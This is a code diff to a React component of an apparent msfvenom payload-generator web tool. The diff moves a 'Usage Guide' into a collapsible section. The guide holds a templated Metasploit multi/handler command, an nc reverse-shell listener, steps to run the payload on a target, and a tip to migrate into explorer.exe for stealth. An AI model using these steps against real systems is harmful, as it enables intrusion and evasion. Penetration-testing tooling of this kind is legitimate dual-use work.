@@ -1,6 +1,7 @@
 "use client";
 
 import { Callout } from "@/components/ui/Callout";
+import { CollapsibleSection } from "@/components/ui/CollapsibleSection";
 import { CommandBlock, InlineCommandRow } from "@/components/ui/CommandBlock";
 import { CopyButton } from "@/components/ui/CopyButton";
 import { MsfvenomSelection, resolvePayloadId } from "@/lib/msfvenom/generate";
@@ -48,25 +49,22 @@ export function GeneratedOutputPanel({
         )}
       </CommandBlock>
 
-      <details className="rounded border border-zinc-200 dark:border-zinc-800" open>
-        <summary className="cursor-pointer px-3 py-2 text-sm font-medium">Usage Guide</summary>
-        <div className="flex flex-col gap-3 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
-          <p>Once you have your payload, catch it with a matching listener:</p>
-          <InlineCommandRow
-            label="Multi/handler (works for all Metasploit payloads)"
-            command={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
-          />
-          <InlineCommandRow label="Raw listener (plain, non-Meterpreter shell payloads only)" command={`nc -nlvp ${guideLport}`} />
-          <p>
-            Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
-            reachable from the target (not 127.0.0.1), and firewall rules on both ends.
-          </p>
-          <p>
-            Once you have a session, Meterpreter&apos;s <code>migrate &lt;PID&gt;</code> command can move execution into another process (e.g.
-            explorer.exe) for stealth. This is a post-exploitation msfconsole command, not something msfvenom generates.
-          </p>
-        </div>
-      </details>
+      <CollapsibleSection title="Usage Guide" storageKey="payloadify:msfvenom-generator:usage-guide-collapsed" defaultOpen={true}>
+        <p className="text-sm text-zinc-600 dark:text-zinc-400">Once you have your payload, catch it with a matching listener:</p>
+        <InlineCommandRow
+          label="Multi/handler (works for all Metasploit payloads)"
+          command={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
+        />
+        <InlineCommandRow label="Raw listener (plain, non-Meterpreter shell payloads only)" command={`nc -nlvp ${guideLport}`} />
+        <p className="text-sm text-zinc-600 dark:text-zinc-400">
+          Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
+          reachable from the target (not 127.0.0.1), and firewall rules on both ends.
+        </p>
+        <p className="text-sm text-zinc-600 dark:text-zinc-400">
+          Once you have a session, Meterpreter&apos;s <code>migrate &lt;PID&gt;</code> command can move execution into another process (e.g.
+          explorer.exe) for stealth. This is a post-exploitation msfconsole command, not something msfvenom generates.
+        </p>
+      </CollapsibleSection>
     </div>
   );
 }
